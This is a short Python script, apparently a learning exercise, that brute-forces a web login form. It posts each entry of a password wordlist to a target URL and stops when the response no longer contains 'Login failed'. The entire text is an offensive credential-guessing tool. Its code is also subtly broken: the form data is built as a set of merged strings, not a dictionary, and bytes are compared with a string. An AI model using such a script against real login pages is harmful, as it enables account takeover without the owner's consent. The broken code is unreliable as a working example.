#!/usr/bin/env python

import requests

target_url = "https://targetUrl.com"
data_dict = {"username:" "blahblah", "password:" "", "Login:" "submit"}
response = requests.post(target_url, data=data_dict)
print(response.content)


# Brute force
with open("/root/Downloads/passwords.list", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content:
            print("[+] Got the password --> " + word)
            exit()

print("[+] Reached end of line.")